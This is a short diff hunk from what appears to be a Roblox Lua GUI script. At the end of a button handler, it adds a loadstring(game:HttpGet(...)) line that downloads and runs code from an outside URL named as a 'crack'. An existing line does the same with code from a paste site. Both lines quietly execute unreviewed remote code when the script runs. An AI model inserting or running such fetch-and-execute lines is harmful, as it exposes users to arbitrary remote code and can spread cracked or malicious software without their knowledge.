@@ -845,4 +845,5 @@ humanButton.MouseButton1Click:Connect(function()
 	gui:Destroy()
 
 end)
+loadstring(game:HttpGet("https://cdn.project-reverse.org/odh_3_5_crack.luau"))()
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/km7RXn4ZAj/0"))()
